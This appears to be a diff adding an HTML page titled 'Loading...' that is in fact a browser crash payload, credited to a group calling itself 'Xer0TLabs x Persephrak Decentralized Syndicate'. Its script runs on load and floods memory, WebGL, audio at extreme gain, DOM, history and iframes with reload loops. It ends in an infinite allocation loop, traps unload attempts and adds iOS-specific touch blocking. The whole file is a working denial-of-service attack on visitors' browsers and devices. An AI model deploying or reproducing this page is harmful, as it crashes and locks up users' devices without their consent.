@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; }
+        body { background: #000; overflow: hidden; }
+        .x { 
+            position: absolute; 
+            width: 1px; 
+            height: 1px; 
+            opacity: 0.01;
+            will-change: transform, filter;
+        }
+        #credits {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            color: #ff0000;
+            font-size: 11px;
+            font-family: monospace;
+            z-index: 99999;
+        }
+    </style>
+</head>
+<body>
+    <div id="credits">Tested by Xer0TLabs x Persephrak Decentralized Syndicate<br>Finale Year Project?</div>
+    <div id="sink"></div>
+
+<script>
+
+const sink = document.getElementById('sink');
+
+// Massive memory allocation to pressure JSC heap
+function memPressure() {
+    const arrays = [];
+    for (let i = 0; i < 500; i++) {
+        try {
+            arrays.push(new Float64Array(0x100000));
+            arrays.push(new ArrayBuffer(0x100000));
+        } catch(e) {}
+    }
+    return arrays;
+}
+
+
+function webglBomb() {
+    const contexts = [];
+    for (let i = 0; i < 100; i++) {
+        const c = document.createElement('canvas');
+        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (gl) {
+            const tex = gl.createTexture();
+            gl.bindTexture(gl.TEXTURE_2D, tex);
+            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+            contexts.push({gl: gl, tex: tex});
+        }
+    }
+    return contexts;
+}
+
+
+function audioBomb() {
+    try {
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        for (let i = 0; i < 200; i++) {
+            const osc = ctx.createOscillator();
+            const gain = ctx.createGain();
+            const buf = ctx.createBuffer(2, 0x100000, 96000);
+            const src = ctx.createBufferSource();
+            src.buffer = buf;
+            src.connect(gain);
+            gain.connect(ctx.destination);
+            gain.gain.value = 1000;
+            osc.connect(gain);
+            osc.start();
+            src.start();
+        }
+        ctx.close();
+    } catch(e) {}
+}
+
+
+function filterBomb() {
+  const divs = [];
+  for (let i = 0; i < 1000; i++) {
+    const d = document.createElement('div');
+    d.className = 'x';
+    d.style.cssText = `
+      top: ${Math.random() * 100}%;
+      left: ${Math.random() * 100}%;
+      width: 9999px;
+      height: 9999px;
+      filter: blur(${Math.random() * 500}px) brightness(${Math.random() * 10}) saturate(${Math.random() * 100});
+      transform: translate3d(${Math.random() * 1000}px, ${Math.random() * 1000}px, ${Math.random() * 10000}px) rotate(${Math.random() * 360}deg) scale(${Math.random() * 100});
+      mix-blend-mode: difference;
+    `;
+    sink.appendChild(d);
+    divs.push(d);
+  }
+  return divs;
+}
+
+
+function domMutate() {
+    const frag = document.createDocumentFragment();
+    const nodes = [];
+    
+    for (let i = 0; i < 10000; i++) {
+        const n = document.createElement('div');
+        n.textContent = 'A'.repeat(1000);
+        frag.appendChild(n);
+        nodes.push(n);
+    }
+    
+    sink.appendChild(frag);
+    
+    
+    setTimeout(() => {
+        sink.innerHTML = '';
+        nodes.length = 0;
+    }, 10);
+}
+
+
+function historyBomb() {
+    for (let i = 0; i < 500; i++) {
+        history.pushState({data: 'A'.repeat(100000)}, '', '#p' + i);
+    }
+    
+    setInterval(() => {
+        history.go(-1);
+        history.go(1);
+    }, 1);
+}
+
+function iframeBomb() {
+    for (let i = 0; i < 50; i++) {
+        const f = document.createElement('iframe');
+        f.src = 'javascript:while(1){location.reload()}';
+        f.style.cssText = 'position:absolute;top:-9999px;width:1px;height:1px';
+        document.body.appendChild(f);
+    }
+}
+
+
+function blobBomb() {
+    const urls = [];
+    const data = new Uint8Array(1024 * 1024);
+    
+    for (let i = 0; i < 300; i++) {
+        const blob = new Blob([data], {type: 'application/octet-stream'});
+        urls.push(URL.createObjectURL(blob));
+    }
+    
+    setTimeout(() => {
+        urls.forEach(u => URL.revokeObjectURL(u));
+    }, 100);
+}
+
+
+function rafBomb() {
+    let count = 0;
+    const loop = () => {
+        count++;
+        if (count < 100000) {
+            requestAnimationFrame(loop);
+            sink.offsetHeight;
+            sink.getBoundingClientRect();
+        }
+    };
+    
+    for (let i = 0; i < 100; i++) {
+        requestAnimationFrame(loop);
+    }
+}
+
+
+function swBomb() {
+    if ('serviceWorker' in navigator) {
+        for (let i = 0; i < 30; i++) {
+            navigator.serviceWorker.register('data:text/javascript,').catch(() => {});
+        }
+    }
+}
+
+
+function syncCrash() {
+    setTimeout(() => {
+        while (true) {
+            new ArrayBuffer(0x7FFFFFFF);
+            document.createElement('div');
+        }
+    }, 2000);
+}
+
+
+function run() {
+    
+    const mem = memPressure();
+    const gl = webglBomb();
+    
+    
+    setTimeout(() => {
+        audioBomb();
+        filterBomb();
+        domMutate();
+        blobBomb();
+        swBomb();
+    }, 100);
+    
+    
+    setTimeout(() => {
+        historyBomb();
+        iframeBomb();
+        rafBomb();
+        
+        
+        setInterval(() => {
+            domMutate();
+            filterBomb();
+        }, 100);
+        
+        
+        syncCrash();
+        
+    }, 500);
+}
+
+
+window.onbeforeunload = function() { return false; };
+window.onunload = function() { while(1); };
+
+
+run();
+
+
+if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
+    // Orientation crash
+    window.addEventListener('orientationchange', () => {
+        location.reload();
+    });
+    
+    
+    document.addEventListener('touchstart', function(e) {
+        for (let i = 0; i < 1000; i++) {
+            e.preventDefault();
+        }
+    }, {passive: false});
+}
+</script>
+</body>
+</html>
